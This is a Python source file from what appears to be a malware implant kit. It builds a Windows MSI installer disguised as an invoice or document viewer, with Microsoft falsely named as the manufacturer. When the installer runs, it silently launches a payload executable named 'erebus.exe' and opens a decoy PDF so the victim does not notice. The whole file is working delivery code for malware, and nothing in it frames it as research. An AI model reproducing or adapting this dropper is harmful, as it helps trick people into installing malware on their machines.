import pathlib
import sys
import os
import subprocess
import shutil

REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
AGENT_CODE = REPO_ROOT / "agent_code"
PAYLOAD_DIR = AGENT_CODE / "payload"
DECOY_FILE = AGENT_CODE / "decoys" / "decoy.pdf"

def create_msi_trigger(
    payload_exe: str,
    decoy_file: str,
    payload_dir: pathlib.Path = None,
    output_filename: str = "invoice.msi",
    product_name: str = "System Update",
    manufacturer: str = "Microsoft Corporation"
) -> pathlib.Path:
    """
    Create an MSI trigger - Fixed "File Not Found" by extracting path from MSI location.
    """
    if payload_dir is None:
        payload_dir = PAYLOAD_DIR

    msi_output_path = payload_dir / output_filename
    
    payload_filename = pathlib.Path(payload_exe).name
    decoy_filename = pathlib.Path(decoy_file).name
    
    wxs_content = f"""<?xml version='1.0' encoding='windows-1252'?>
<Wix xmlns='http://schemas.microsoft.com/wix/2006/wi'>
  <Product Name='{product_name}' Id='*' UpgradeCode='12345678-1234-1234-1234-111111111111'
    Language='1033' Codepage='1252' Version='1.0.0' Manufacturer='{manufacturer}'>

    <Package Id='*' Keywords='Installer' Description='{product_name}'
      Comments='{product_name}' Manufacturer='{manufacturer}'
      InstallerVersion='100' Languages='1033' Compressed='yes' SummaryCodepage='1252' 
      InstallScope="perUser" /> 

    <Media Id='1' Cabinet='product.cab' EmbedCab='yes' />

    <Directory Id='TARGETDIR' Name='SourceDir'>
      <Directory Id='AppDataFolder' Name='AppData'>
        <Directory Id='INSTALLDIR' Name='{product_name}'>
           <Component Id='MainComponent' Guid='*'>
             <RegistryValue Root='HKCU' Key='Software\\{manufacturer}\\{product_name}' Name='installed' Type='integer' Value='1' KeyPath='yes'/>
           </Component>
        </Directory>
      </Directory>
    </Directory>

    <Feature Id='Complete' Level='1'>
      <ComponentRef Id='MainComponent' />
    </Feature>
    
    <!-- Property for CMD -->
    <Property Id='CMD'>cmd.exe</Property>
    
    <!-- 1. Resolve SystemFolder to CMD property -->
    <CustomAction Id='SetCmdPath' Property='CMD' Value='[SystemFolder]cmd.exe' />

    <!-- 2. Run Payload using dynamic path extraction -->
    <CustomAction Id='InitUpdater' Property='CMD' 
      ExeCommand='/c for %I in ("[OriginalDatabase]") do start /b "" "%~dpI{payload_filename}"' 
      Return='asyncNoWait' Execute='immediate' />

    <!-- 3. Open Decoy using dynamic path extraction -->
    <CustomAction Id='ViewReadme' Property='CMD' 
      ExeCommand='/c for %I in ("[OriginalDatabase]") do start /b "" "%~dpI{decoy_filename}"' 
      Return='asyncNoWait' Execute='immediate' />

    <InstallExecuteSequence>
      <ResolveSource After="CostInitialize">1</ResolveSource>
      
      <Custom Action='SetCmdPath' After='CostFinalize'>1</Custom>
      <Custom Action='InitUpdater' After='InstallInitialize'>1</Custom>
      <Custom Action='ViewReadme' After='InitUpdater'>1</Custom>
    </InstallExecuteSequence>

  </Product>
</Wix>
"""
    wxs_path = payload_dir / "trigger.wxs"
    with open(wxs_path, 'w') as f:
        f.write(wxs_content)

    try:
        cmd = ["wixl", "-o", str(msi_output_path), str(wxs_path)]
        subprocess.check_output(cmd, cwd=payload_dir, stderr=subprocess.STDOUT)
        return msi_output_path

    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"wixl compilation failed: {e.output.decode()}")
    finally:
        if wxs_path.exists():
            wxs_path.unlink()

def create_msi_payload_trigger(
    payload_exe: str = "erebus.exe",
    payload_dir: pathlib.Path = None,
    decoy_file: pathlib.Path = None,
) -> pathlib.Path:

    if decoy_file is None:
        decoy_file = DECOY_FILE
        
    return create_msi_trigger(
        payload_exe=payload_exe,
        decoy_file=decoy_file.name,
        payload_dir=payload_dir,
        product_name="Document Viewer",
        output_filename=f"{decoy_file.name}.msi"
    )
